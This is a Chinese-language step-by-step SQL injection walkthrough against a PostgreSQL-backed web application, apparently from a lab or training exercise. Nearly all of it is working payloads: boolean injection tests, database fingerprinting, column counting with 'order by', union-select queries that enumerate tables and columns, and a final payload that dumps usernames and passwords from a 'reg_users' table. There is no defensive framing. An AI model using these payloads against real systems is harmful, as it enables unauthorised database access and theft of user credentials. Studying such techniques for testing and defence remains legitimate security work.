一、判断是否存在注入

and 1=2 返回错误

and 1=1 返回正常，存在注入

and 1::int=1 返回正常说明是postgresql数据库

  

二、判断字段数量

order by 5 返回错误

![](../Images/fbdff68ad35b726222d8502258b7ece2.png)

order by 4 返回正常说明，有四列

![](../Images/6a046cbc1f8c0a9a49521b280024b6a6.png)

  

三、联合查询

union select '1','2','3','4' 可以看出2/3号位置显示

![](../Images/2aeb4e12d64acbf542231c374341ac93.png)

  

四、获取当前数据库

union select '1',current\_database(),'3','4'

![](../Images/6377dae8fef6a21ff3709a2d723b1df6.png)

  

五、获取第一个表

union select '1',relname,'3','4' from  pg\_stat\_user\_tables limit 1 offset 0

![](../Images/6a77c8237be8746784cbc67647a7d363.png)

获取第二个表

union select '1',relname,relname,'4' from  pg\_stat\_user\_tables limit 1 offset 1

  

六、获取第一个字段

union select '1',column\_name,'3','4' from information\_schema.columns where table\_name='reg\_users' limit 1 offset 0

![](../Images/d0a7e5f01bd702b27def9a2a530302bf.png)

获取第二个字段

union select '1',column\_name,'3','4' from information\_schema.columns where table\_name='reg\_users' limit 1 offset 1

  

七、获取字段内容

union select '1',''||name||','||password||'','3','4' from  reg\_users

![](../Images/444cdcfd2a5f0b275bf04d0c51981fcc.png)
